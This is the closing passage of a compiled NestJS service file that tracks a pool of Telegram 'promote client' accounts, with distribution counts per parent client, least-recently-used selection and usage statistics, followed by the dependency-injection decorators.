            const neverUsed = neverUsedCountMap.get(client.clientId) || 0;
            const usedInLast24Hours = recentlyUsedCountMap.get(client.clientId) || 0;
            const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - activeCount);
            const status = needed === 0 ? 'sufficient' : 'needs_more';
            distributionPerClient.push({
                clientId: client.clientId,
                assignedCount,
                activeCount,
                inactiveCount,
                needed,
                status,
                neverUsed,
                usedInLast24Hours
            });
            if (status === 'sufficient') {
                clientsWithSufficient++;
            }
            else {
                clientsNeedingMore++;
                totalNeeded += needed;
            }
        }
        const maxPerTrigger = 10;
        const triggersNeeded = Math.ceil(totalNeeded / maxPerTrigger);
        return {
            totalPromoteClients,
            unassignedPromoteClients,
            activePromoteClients,
            inactivePromoteClients,
            distributionPerClient,
            summary: {
                clientsWithSufficientPromoteClients: clientsWithSufficient,
                clientsNeedingPromoteClients: clientsNeedingMore,
                totalPromoteClientsNeeded: totalNeeded,
                maxPromoteClientsPerTrigger: maxPerTrigger,
                triggersNeededToSatisfyAll: triggersNeeded
            }
        };
    }
    async getPromoteClientsByStatus(status) {
        return this.promoteClientModel.find({ status }).exec();
    }
    async getPromoteClientsWithMessages() {
        return this.promoteClientModel
            .find({}, { mobile: 1, status: 1, message: 1, clientId: 1, lastUsed: 1 })
            .exec();
    }
    async getLeastRecentlyUsedPromoteClients(clientId, limit = 1) {
        return this.promoteClientModel
            .find({ clientId, status: 'active' })
            .sort({ lastUsed: 1, _id: 1 })
            .limit(limit)
            .exec();
    }
    async getNextAvailablePromoteClient(clientId) {
        const clients = await this.getLeastRecentlyUsedPromoteClients(clientId, 1);
        return clients.length > 0 ? clients[0] : null;
    }
    async getUnusedPromoteClients(hoursAgo = 24, clientId) {
        const cutoffDate = new Date(Date.now() - (hoursAgo * 60 * 60 * 1000));
        const filter = {
            status: 'active',
            $or: [
                { lastUsed: { $lt: cutoffDate } },
                { lastUsed: { $exists: false } },
                { lastUsed: null }
            ]
        };
        if (clientId) {
            filter.clientId = clientId;
        }
        return this.promoteClientModel.find(filter).exec();
    }
    async getUsageStatistics(clientId) {
        const filter = { status: 'active' };
        if (clientId) {
            filter.clientId = clientId;
        }
        const now = new Date();
        const last24Hours = new Date(now.getTime() - (24 * 60 * 60 * 1000));
        const lastWeek = new Date(now.getTime() - (7 * 24 * 60 * 60 * 1000));
        const [totalClients, neverUsed, usedInLast24Hours, usedInLastWeek, allClients] = await Promise.all([
            this.promoteClientModel.countDocuments(filter),
            this.promoteClientModel.countDocuments({
                ...filter,
                $or: [
                    { lastUsed: { $exists: false } },
                    { lastUsed: null }
                ]
            }),
            this.promoteClientModel.countDocuments({
                ...filter,
                lastUsed: { $gte: last24Hours }
            }),
            this.promoteClientModel.countDocuments({
                ...filter,
                lastUsed: { $gte: lastWeek }
            }),
            this.promoteClientModel.find(filter, { lastUsed: 1, createdAt: 1 }).exec()
        ]);
        let totalGap = 0;
        let gapCount = 0;
        for (const client of allClients) {
            if (client.lastUsed) {
                const gap = now.getTime() - new Date(client.lastUsed).getTime();
                totalGap += gap;
                gapCount++;
            }
        }
        const averageUsageGap = gapCount > 0 ? totalGap / gapCount / (60 * 60 * 1000) : 0;
        return {
            totalClients,
            neverUsed,
            usedInLast24Hours,
            usedInLastWeek,
            averageUsageGap
        };
    }
};
exports.PromoteClientService = PromoteClientService;
exports.PromoteClientService = PromoteClientService = PromoteClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(promote_client_schema_1.PromoteClient.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => channels_service_1.ChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
    __param(7, (0, common_1.Inject)((0, common_1.forwardRef)(() => session_manager_1.SessionService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        buffer_client_service_1.BufferClientService,
        session_manager_1.SessionService])
], PromoteClientService);
//# sourceMappingURL=promote-client.service.js.map